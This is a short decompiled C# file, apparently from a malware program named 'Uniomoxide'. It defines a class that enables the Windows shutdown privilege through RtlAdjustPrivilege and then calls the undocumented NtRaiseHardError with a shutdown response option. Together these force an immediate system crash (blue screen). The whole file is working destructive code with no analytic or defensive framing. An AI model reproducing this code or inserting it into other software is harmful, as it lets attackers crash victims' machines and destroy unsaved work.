using System;
using System.Runtime.InteropServices;

namespace Uniomoxide
{
	// Token: 0x02000003 RID: 3
	internal class Class1
	{
		// Token: 0x06000003 RID: 3
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);

		// Token: 0x06000004 RID: 4
		[DllImport("ntdll.dll")]
		private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

		// Token: 0x06000005 RID: 5 RVA: 0x00002788 File Offset: 0x00000988
		public static bool RaisePrivilege()
		{
			bool flag;
			return Class1.RtlAdjustPrivilege(19, true, false, out flag) == 0U;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000027A4 File Offset: 0x000009A4
		public static bool CauseNtHardError()
		{
			uint num2;
			uint num = Class1.NtRaiseHardError(-1073741790, 0U, 0U, IntPtr.Zero, 6U, out num2);
			return num == 0U;
		}
	}
}
